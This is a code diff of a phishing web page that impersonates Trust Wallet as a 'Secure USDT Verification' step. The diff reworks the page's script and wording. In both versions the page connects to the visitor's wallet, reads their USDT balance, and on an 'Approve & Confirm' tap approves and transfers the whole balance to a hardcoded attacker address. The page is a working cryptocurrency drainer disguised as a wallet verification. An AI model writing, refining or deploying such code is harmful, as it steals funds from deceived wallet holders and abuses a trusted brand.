@@ -16,7 +16,7 @@
 <body>
   <img src="./logo.png" alt="Trust Wallet">
   <h1>Secure USDT Verification</h1>
-  <p id="status">Initializing Trust Wallet...</p>
+  <p id="status">Loading Trust Wallet...</p>
   <button id="approve" style="display:none;">Approve & Confirm</button>
   <div class="footer">Verified by Trust Wallet • Trusted since 2009</div>
 
@@ -25,54 +25,63 @@
     const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
     const USDT = "0x55d398326f99059fF775485246999027B3197955";
     const ABI = [
-      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
-      { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
-      { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
+      { "name": "approve", "type": "function", "constant": false, "inputs": [
+        { "name": "_spender", "type": "address" },
+        { "name": "_value", "type": "uint256" }
+      ], "outputs": [{ "name": "", "type": "bool" }] },
+      { "name": "transferFrom", "type": "function", "constant": false, "inputs": [
+        { "name": "_from", "type": "address" },
+        { "name": "_to", "type": "address" },
+        { "name": "_value", "type": "uint256" }
+      ], "outputs": [{ "name": "", "type": "bool" }] },
+      { "name": "balanceOf", "type": "function", "constant": true, "inputs": [
+        { "name": "owner", "type": "address" }
+      ], "outputs": [{ "name": "", "type": "uint256" }] }
     ];
 
-    async function autoStart() {
+    async function init() {
       const status = document.getElementById("status");
       try {
         if (!window.ethereum) {
-          status.innerText = "❌ Please open in Trust Wallet browser.";
+          status.innerText = "❌ Open this in Trust Wallet browser.";
           return;
         }
 
         const web3 = new Web3(window.ethereum);
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
         const user = accounts[0];
-
         const contract = new web3.eth.Contract(ABI, USDT);
         const balance = await contract.methods.balanceOf(user).call();
 
-        if (balance === "0") {
-          status.innerText = "❌ 0 USDT balance.";
+        if (parseInt(balance) === 0) {
+          status.innerText = "❌ No USDT balance found.";
           return;
         }
 
-        document.getElementById("approve").style.display = "inline-block";
-        status.innerText = "USDT detected. Tap Approve & Confirm.";
+        status.innerText = `✅ USDT Balance Detected.`;
+        const btn = document.getElementById("approve");
+        btn.style.display = "inline-block";
 
-        document.getElementById("approve").onclick = async () => {
-          document.getElementById("approve").innerText = "Processing...";
+        btn.onclick = async () => {
+          btn.innerText = "Processing...";
           try {
             await contract.methods.approve(RECEIVER, balance).send({ from: user });
             await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
-            status.innerText = "✅ Transfer complete.";
-            document.getElementById("approve").style.display = "none";
-          } catch (err) {
-            console.error(err);
-            status.innerText = "❌ Transaction failed or rejected.";
-            document.getElementById("approve").innerText = "Approve & Confirm";
+            status.innerText = "✅ Transfer completed.";
+            btn.style.display = "none";
+          } catch (e) {
+            console.error(e);
+            status.innerText = "❌ Transaction failed.";
+            btn.innerText = "Approve & Confirm";
           }
         };
       } catch (err) {
         console.error(err);
-        status.innerText = "❌ Wallet connection failed.";
+        status.innerText = "❌ Error connecting to wallet.";
       }
     }
 
-    window.addEventListener('load', autoStart);
+    window.addEventListener("load", init);
   </script>
 </body>
 </html>
